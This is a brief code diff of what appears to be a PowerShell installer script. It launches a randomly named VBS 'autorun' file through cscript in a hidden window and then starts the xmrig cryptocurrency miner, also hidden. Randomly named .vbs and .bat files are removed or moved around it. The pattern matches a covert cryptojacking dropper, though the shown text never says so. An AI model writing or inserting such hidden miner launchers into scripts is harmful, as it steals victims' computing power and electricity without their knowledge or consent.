@@ -200,11 +200,11 @@ Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
 #Move-Item -Path "$initial_dir\nEQlCzTBpDrO.bat" -Destination $initial_dir\esSDyVlwHITj
 
-Start-Process -windowstyle hidden -FilePath "cscript.exe" -ArgumentList "$initial_dir\ZDaFvwjOosKx.vbs"
 
+cd $initial_dir
 
 # Start Autorun
-cd $initial_dir
+Start-Process -windowstyle hidden -FilePath "cscript.exe" -ArgumentList "$initial_dir\ZDaFvwjOosKx.vbs"
 
 # Start Rig
 Start-Process -windowstyle hidden -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" 
